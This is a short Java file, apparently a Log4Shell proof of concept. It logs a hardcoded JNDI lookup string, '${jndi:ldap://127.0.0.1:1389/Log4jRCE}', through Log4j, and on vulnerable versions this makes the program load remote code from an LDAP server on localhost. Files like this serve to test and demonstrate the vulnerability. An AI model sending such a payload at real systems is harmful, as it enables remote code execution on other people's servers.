import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class WebServer {
    private static final Logger logger = LogManager.getLogger(WebServer.class);

    public static void main(String[] args) {
        String param = "${jndi:ldap://127.0.0.1:1389/Log4jRCE}";
        logger.error("{}", param);
    }
}
